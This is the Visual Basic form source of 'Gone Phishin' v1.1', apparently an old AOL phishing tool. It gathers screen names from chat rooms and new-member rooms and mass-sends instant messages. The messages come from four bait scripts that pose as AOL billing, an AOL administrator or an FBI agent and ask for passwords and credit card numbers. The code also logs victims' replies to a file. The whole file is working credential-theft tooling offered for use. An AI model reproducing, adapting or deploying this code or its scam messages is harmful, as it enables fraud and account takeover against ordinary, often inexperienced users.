VERSION 2.00
Begin Form Phisher 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   3  'Fixed Double
   Caption         =   "Gone Phishin' v1.1"
   ClientHeight    =   5655
   ClientLeft      =   8385
   ClientTop       =   645
   ClientWidth     =   3495
   Height          =   6060
   Icon            =   PHISHER.FRX:0000
   Left            =   8325
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   PHISHER.FRX:0302
   ScaleHeight     =   5655
   ScaleWidth      =   3495
   Top             =   300
   Width           =   3615
   Begin SSCommand Command3D10 
      Caption         =   "Stop"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   18
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   2040
      RoundedCorners  =   0   'False
      TabIndex        =   23
      Top             =   480
      Visible         =   0   'False
      Width           =   1335
   End
   Begin PictureBox Picture1 
      BackColor       =   &H00000000&
      Height          =   5655
      Left            =   3360
      ScaleHeight     =   5625
      ScaleWidth      =   3465
      TabIndex        =   20
      Top             =   5520
      Width           =   3495
      Begin Image Image1 
         Height          =   2625
         Left            =   480
         Picture         =   PHISHER.FRX:2512C
         Top             =   2520
         Width           =   2670
      End
      Begin Label Label2 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Gone Phishin'"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   45
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00FF0000&
         Height          =   2055
         Left            =   0
         TabIndex        =   21
         Top             =   120
         Width           =   3495
      End
   End
   Begin Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   3120
      Top             =   3720
   End
   Begin SSPanel Panel3D5 
      BevelInner      =   2  'Raised
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00FF0000&
      Height          =   375
      Left            =   120
      RoundedCorners  =   0   'False
      ShadowColor     =   1  'Black
      TabIndex        =   19
      Top             =   5160
      Visible         =   0   'False
      Width           =   3255
   End
   Begin SSPanel Panel3D4 
      Alignment       =   6  'Center - TOP
      BevelInner      =   2  'Raised
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   3135
      Left            =   120
      RoundedCorners  =   0   'False
      ShadowColor     =   1  'Black
      TabIndex        =   18
      Top             =   120
      Visible         =   0   'False
      Width           =   1815
      Begin ListBox List1 
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   2760
         Left            =   120
         Sorted          =   -1  'True
         TabIndex        =   11
         Top             =   240
         Visible         =   0   'False
         Width           =   1575
      End
   End
   Begin SSPanel Panel3D3 
      Alignment       =   1  'Left Justify - MIDDLE
      BevelInner      =   1  'Inset
      ForeColor       =   &H00000000&
      Height          =   1455
      Left            =   120
      RoundedCorners  =   0   'False
      ShadowColor     =   1  'Black
      TabIndex        =   17
      Top             =   3720
      Visible         =   0   'False
      Width           =   3255
      Begin TextBox Text2 
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   6.75
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   1215
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   10
         Top             =   120
         Visible         =   0   'False
         Width           =   3015
      End
   End
   Begin SSPanel Panel3D2 
      Alignment       =   1  'Left Justify - MIDDLE
      BevelInner      =   2  'Raised
      ForeColor       =   &H00000000&
      Height          =   3135
      Left            =   1920
      RoundedCorners  =   0   'False
      ShadowColor     =   1  'Black
      TabIndex        =   16
      Top             =   120
      Visible         =   0   'False
      Width           =   1455
      Begin SSCommand Command3D9 
         Caption         =   "Add NMLs"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   4
         Top             =   1440
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D7 
         Caption         =   "SN Replacer"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   5
         Top             =   1800
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D6 
         Caption         =   "Phake Maker"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   6
         Top             =   2040
         Visible         =   0   'False
         Width           =   1215
      End
      Begin TextBox Text1 
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         Height          =   315
         Left            =   120
         MaxLength       =   10
         TabIndex        =   12
         Top             =   120
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D1 
         Caption         =   "Add SN"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   0
         Top             =   480
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D2 
         Caption         =   "Remove SN"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   2
         Top             =   960
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D3 
         Caption         =   "Add Room"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   1
         Top             =   720
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D4 
         Caption         =   "Go Phishing!"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   8
         Top             =   2760
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D5 
         Caption         =   "Open IM Log"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   7
         Top             =   2400
         Visible         =   0   'False
         Width           =   1215
      End
      Begin SSCommand Command3D8 
         Caption         =   "Clear List"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         RoundedCorners  =   0   'False
         TabIndex        =   3
         Top             =   1200
         Visible         =   0   'False
         Width           =   1215
      End
   End
   Begin SSPanel Panel3D1 
      BevelInner      =   1  'Inset
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   120
      RoundedCorners  =   0   'False
      ShadowColor     =   1  'Black
      TabIndex        =   15
      Top             =   3240
      Visible         =   0   'False
      Width           =   3255
      Begin SSOption Option3D4 
         Caption         =   "Bait 4"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   2400
         TabIndex        =   22
         TabStop         =   0   'False
         Top             =   120
         Visible         =   0   'False
         Width           =   735
      End
      Begin SSOption Option3D1 
         Caption         =   "Bait 1"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   120
         Value           =   -1  'True
         Visible         =   0   'False
         Width           =   735
      End
      Begin SSOption Option3D2 
         Caption         =   "Bait 2"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   880
         TabIndex        =   13
         TabStop         =   0   'False
         Top             =   120
         Visible         =   0   'False
         Width           =   735
      End
      Begin SSOption Option3D3 
         Caption         =   "Bait 3"
         FontBold        =   -1  'True
         FontItalic      =   0   'False
         FontName        =   "Arial"
         FontSize        =   8.25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   1640
         TabIndex        =   14
         TabStop         =   0   'False
         Top             =   120
         Visible         =   0   'False
         Width           =   735
      End
   End
   Begin Label Label5 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "0"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   18
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   2040
      TabIndex        =   24
      Top             =   2280
      Visible         =   0   'False
      Width           =   1335
   End
   Begin Label Label4 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "0"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   18
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   2040
      TabIndex        =   27
      Top             =   1680
      Visible         =   0   'False
      Width           =   1335
   End
   Begin Label Label3 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "of"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   12
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   2040
      TabIndex        =   26
      Top             =   2040
      Visible         =   0   'False
      Width           =   1335
   End
   Begin Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Phishing..."
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   12
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   2040
      TabIndex        =   25
      Top             =   1320
      Visible         =   0   'False
      Width           =   1335
   End
End
' PHISHER.FRM
Option Explicit
Const c0040 = 1036 ' &H40C%
Const c0054 = 16 ' &H10%
Const c009A = 256 ' &H100%
Const c009C = 32 ' &H20%
Const c00A2 = 257 ' &H101%
Const c00BA = 12 ' &HC%
Const c00FC = 1031 ' &H407%
Const c0106 =-1 ' &HFFFF%
Const c0108 = 3 ' &H3%
Const c01B0 = 14 ' &HE%
Const c01B8 = 13 ' &HD%

Sub Command3D1_Click ()
If  Text1 <> "" Then List1.AddItem Text1
Text1 = ""
Text1.SetFocus
Panel3D4.Caption = "Phish List (" + LTrim$(Str$(List1.ListCount)) + ")"
End Sub

Sub Command3D10_Click ()
gv0070 = 1
End Sub

Sub Command3D2_Click ()
On Error Resume Next
List1.RemoveItem List1.ListIndex
List1.ListIndex = 0
Panel3D4.Caption = "Phish List (" + LTrim$(Str$(List1.ListCount)) + ")"
End Sub

Sub Command3D3_Click ()
Dim l0030 As Variant
Dim l0036 As Variant
Dim l003C As Variant
' Const c0040 = 1036 ' &H40C%
Dim l0044 As Variant
Dim l0048 As Variant
Dim l004C As String
Dim l0050 As Variant
' Const c0054 = 16 ' &H10%
On Error Resume Next
l0030 = extfn3078("AOL Frame25", "America  Online")
l0036 = fn3F58("People")
l003C = extfnC8(l0036, "_AOL_Listbox")
If  l003C = 0 Then MsgBox "Open a People list, dumbass!", 16: Exit Sub
l0044 = extfn6E8(l003C, c0040, 0&, 0&)
For l0048 = 0 To l0044 - 1
l004C$ = Space$(144)
l0050 = extfn138(l0048, l004C$)
l004C$ = LTrim$(RTrim$(l004C$))
If  LCase$(Left$(l004C$, 4)) <> "host" And Left$(l004C$, 5) <> "Guide" Then List1.AddItem l004C$
Next l0048
l0050 = extfn6E8(l0036, c0054, 0&, 0&)
Panel3D4.Caption = "Phish List (" + LTrim$(Str$(List1.ListCount)) + ")"
End Sub

Sub Command3D4_Click ()
Dim l005A As Variant
Dim l0076 As Variant
Dim l007A As Variant
Dim l0084 As Variant
Dim l0088 As Variant
Dim l008C As Variant
Dim l0092 As Variant
Dim l0096 As Variant
' Const c009A = 256 ' &H100%
' Const c009C = 32 ' &H20%
Dim l009E As Variant
' Const c00A2 = 257 ' &H101%
Dim l00A6 As Variant
Dim l00AC As Variant
Dim l00B2 As Variant
Dim l00B6 As Variant
' Const c00BA = 12 ' &HC%
On Error Resume Next
l005A = Phisher.Height
Phisher.Height = 3750
Label5.Caption = List1.ListCount
Panel3D2.Visible = False
Panel3D1.Visible = False
Command3D10.Visible = True
If  List1.ListCount < 3 Then MsgBox "Phish more than 2 people, dumbass!", 16: GoTo L1800
For l0076 = 1 To 30
  sub3FC8 ("^{F4}")
  DoEvents
Next l0076
For l007A = 0 To List1.ListCount - 1
  Label4.Caption = Val(Label4.Caption) + 1
  l0084 = fn3F58("Welcome")
  If  l0084 = 0 Then MsgBox "Gone Phishin' has detected that you are not currently signed onto AOL and has stopped phishing!", 16: GoTo L1800
  l0088 = 1
  While l0088 <> 0
    DoEvents
    If  gv0070 = 1 Then GoTo L1800
    l008C = fn3F58("Send Instant")
    l0088 = extfn100(l008C, "To:")
    DoEvents
    l0092 = extfn3078("#32770", "America Online")
    l0096 = extfn100(l0092, "OK")
    If  l0096 <> 0 Then
      l009E = extfn6E8(l0096, c009A, c009C, 0&)
      l009E = extfn6E8(l0096, c00A2, c009C, 0&)
      DoEvents
      l009E = extfn6E8(l008C, c0054, 0&, 0&)
    End If
  Wend
  sub3FC8 ("^i")
  DoEvents
  l00A6 = fn4038("To:")
  DoEvents
  l008C = extfn3008(l00A6)
  l00AC = extfnC8(l008C, "_AOL_Edit")
  l00B2 = extfn3120(l00AC, 2)
  l00B6 = extfn100(l008C, "Send")
  DoEvents
  l009E = extfn6B0(l00AC, c00BA, 0&, List1.List(0))
  l009E = extfn6B0(l00B2, c00BA, 0&, Text2)
  DoEvents
  l009E = extfn6E8(l00B6, c009A, c009C, 0&)
  l009E = extfn6E8(l00B6, c00A2, c009C, 0&)
  DoEvents
  List1.RemoveItem 0
  Panel3D4.Caption = "Phish List (" + LTrim$(Str$(List1.ListCount)) + ")"
Next l007A
l009E = extfn170(App.Path + "\created.wav", 1)
GoTo L1800

L1800:
gv0070 = 0
Panel3D2.Visible = True
Panel3D1.Visible = True
Phisher.Height = l005A
Label4.Caption = "0"
Command3D10.Visible = False
Exit Sub
End Sub


Sub Command3D5_Click ()
On Error Resume Next
If  Command3D5.Caption = "Open IM Log" Then
  Open App.Path + "\phish.log" For Append As #5
  Timer1.Enabled = True
  MsgBox "All IMs recieved will now be closed and added to " + App.Path + "\phish.log. You must close the log before you view it. Also, do NOT view it using AOL, use something like notepad instead. =]"
  Command3D5.Caption = "Close IM Log"
Else
  Close #5
  Timer1.Enabled = False
  Command3D5.Caption = "Open IM Log"
End If
End Sub

Sub Command3D6_Click ()
Phisher.Hide
Fakes.Show
End Sub

Sub Command3D7_Click ()
Phisher.Hide
ResetSN.Show
End Sub

Sub Command3D8_Click ()
Dim l00DE As Variant
On Error Resume Next
For l00DE = 1 To List1.ListCount
List1.ListIndex = 0
List1.RemoveItem List1.ListIndex
Next l00DE
Panel3D4.Caption = "Phish List (" + LTrim$(Str$(List1.ListCount)) + ")"
End Sub

Sub Command3D9_Click ()
Dim l00E2 As Variant
Dim l00E6 As Variant
Dim l00EA As Variant
Dim l00EE As Variant
Dim l00F2 As String
Dim l00F4 As Variant
Dim l00F8 As Variant
' Const c00FC = 1031 ' &H407%
Dim l00FE As Variant
Dim l0102 As Variant
' Const c0106 =-1 ' &HFFFF%
' Const c0108 = 3 ' &H3%
On Error Resume Next
l00E2 = fn3F58("Public Rooms")
If  l00E2 = 0 Then MsgBox "Open up the Public Rooms list, dumbass!": Exit Sub
l00E6 = extfnC8(l00E2, "_AOL_Listbox")
l00EA = extfn6E8(l00E6, c0040, 0&, 0&)
For l00EE = 0 To l00EA - 1
l00F2$ = Space$(144)
l00F4 = extfn138(l00EE, l00F2$)
l00F2$ = LCase$(LTrim$(RTrim$(l00F2$)))
l00F8 = InStr(1, l00F2$, "new member")
If  l00F8 = 0 Then l00F8 = InStr(1, l00F2$, "newmember")
If  l00F8 <> 0 Then
  l00F4 = extfn6E8(l00E6, c00FC, l00EE, 0&)
  sub4198 (.1#)
  l00FE = extfn100(l00E2, "Who's Here?")
  l00F4 = extfn6E8(l00FE, c009A, c009C, 0&)
  l00F4 = extfn6E8(l00FE, c00A2, c009C, 0&)
  l0102 = fn4038("People")
  DoEvents
  sub4210 (1)
  Command3D3_Click
  sub4198 (.1#)
End If
Panel3D4.Caption = "Phish List (" + LTrim$(Str$(List1.ListCount)) + ")"
Next l00EE
End Sub

Sub Form_Load ()
Dim l010C As Variant
Dim l011A As Variant
Dim l011E As Variant
Dim l0122 As Variant
Dim l0126 As Variant
Dim l0130 As Variant
Dim l013A As Variant
Dim l0186 As Variant
l010C = extfn4120(Phisher.hWnd, c0106, 0, 0, 0, 0, c0108)
Phisher.Top = 0
Phisher.Left = Screen.Width - Phisher.Width
Picture1.Top = 0
Picture1.Left = 0
l011A = Phisher.Height
Phisher.Height = 0
Option3D1_Click (1)
Phisher.Enabled = False
Phisher.Show
For l011E = 1 To l011A Step 120
  Phisher.Height = l011E
  DoEvents
Next l011E
l0122 = extfn170(App.Path + "\griffith.wav", 1)
sub4210 (4)
For l011E = Picture1.Height To 0 Step -60
  Picture1.Height = l011E
  DoEvents
Next l011E
Picture1.Visible = False
l011A = Panel3D4.Height
l0126 = Panel3D1.Height
l0130 = Panel3D3.Height
l013A = Panel3D5.Height
Panel3D4.Height = 0
Panel3D2.Height = 0
Panel3D1.Height = 0
Panel3D3.Height = 0
Panel3D5.Height = 0
Panel3D4.Visible = True
Panel3D2.Visible = True
For l011E = 1 To l011A Step 15
  Panel3D4.Height = l011E
  Panel3D2.Height = l011E
  DoEvents
Next l011E
Panel3D1.Visible = True
For l011E = 1 To l0126 Step 15
  Panel3D1.Height = l011E
  DoEvents
Next l011E
Panel3D3.Visible = True
For l011E = 1 To l0130 Step 15
  Panel3D3.Height = l011E
  DoEvents
Next l011E
Panel3D5.Visible = True
For l011E = 1 To l013A Step 15
  Panel3D5.Height = l011E
  DoEvents
Next l011E
List1.Visible = True
Text1.Visible = True
Command3D1.Visible = True
Command3D2.Visible = True
Command3D3.Visible = True
Command3D4.Visible = True
Command3D5.Visible = True
Command3D6.Visible = True
Command3D7.Visible = True
Command3D8.Visible = True
Command3D9.Visible = True
Option3D1.Visible = True
Option3D2.Visible = True
Option3D3.Visible = True
Option3D4.Visible = True
Text2.Visible = True
Panel3D4.Caption = "Phish List (0)"
sub4210 (1)
l0186 = "Written by BaKa! Greets to Rad && Vic!"
For l011E = 1 To Len(l0186)
  Panel3D5.ForeColor = &HFF
  Panel3D5.BackColor = &HFFFF&
  sub4198 (.025#)
  Panel3D5.Caption = Left$(l0186, l011E)
  Panel3D5.ForeColor = &HFF0000&
  Panel3D5.BackColor = &HFF00&
  sub4198 (.025#)
Next l011E
Panel3D5.BackColor = &HC0C0C0&
Phisher.Enabled = True
l0122 = extfn170(App.Path + "\created.wav", 1)
Label1.Visible = True
Label3.Visible = True
Label4.Visible = True
Label5.Visible = True
End Sub

Sub Form_Unload (p1 As Integer)
End
End Sub

Sub Option3D1_Click (Value As Integer)
Text2 = "Good evening, I am with the America Online billing department.  We are sorry to inform you that we are experiencing difficulties with our records and we have lost your account information.  I need you to verify your log-on password with me so that I can validate you as a user, and fix our records promptly.  Thank you for your cooperation and continue to enjoy America Online!"
End Sub

Sub Option3D2_Click (Value As Integer)
Text2 = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with AOLNet, I need you to verify your log-on password with me so that you can continue this session on America Online.  We apologize for this inconvenience, and thank you for your cooperation."
End Sub

Sub Option3D3_Click (Value As Integer)
Text2 = Chr$(13) + Chr$(10) + "ATTENTION: AOL NEWS" + Chr$(13) + Chr$(10) + "******************************" + Chr$(13) + Chr$(10) + "Hi, I'm with the America Online billing department.  Due to a problem we our experiencing with our records, we have lost vital information concerning your account.  We need you to hit the Respond button and reply back with your current password so we may verify this information and correct the problem as soon as possible to avoid unneeded cancellation of your account.  Thank you for your cooperation."
End Sub

Sub Option3D4_Click (Value As Integer)
Text2 = "Hello, I am an undercover FBI agent. We have been monitoring the online activity of your account for the past three weeks and have reason to believe that hackers are using your account for illegal purposes. To verify that you are the legal user of that account please enter your America Online password, credit card number and expiration date. If you fail to respond, your account will have to be cancelled for security reasons. Thank you for cooperating."
End Sub

Sub Text1_KeyPress (KeyAscii As Integer)
If  KeyAscii = 13 Then
  KeyAscii = 0
  Command3D1_Click
End If
End Sub

Sub Timer1_Timer ()
Dim l01A4 As Variant
Dim l01A8 As Variant
Dim l01AC As Variant
' Const c01B0 = 14 ' &HE%
Dim l01B2 As Variant
Dim l01B6 As String
' Const c01B8 = 13 ' &HD%
Dim l01BA As Variant
l01A4 = fn3F90()
l01A8 = extfn100(l01A4, ">Instant Message")
If  l01A8 = 0 Then l01A8 = extfn100(l01A4, " Instant Message")
l01AC = extfnC8(l01A8, "_AOL_View")
l01B2 = extfn6E8(l01AC, c01B0, 0&, 0&)
l01B6$ = Space$(l01B2)
l01BA = extfn6B0(l01AC, c01B8, l01B2 + 1, l01B6$)
l01BA = extfn6E8(l01A8, c0054, 0&, 0&)
l01B6$ = RTrim$(l01B6$)
If  l01B6$ <> "" Then
Print #5, l01B6$
End If
End Sub
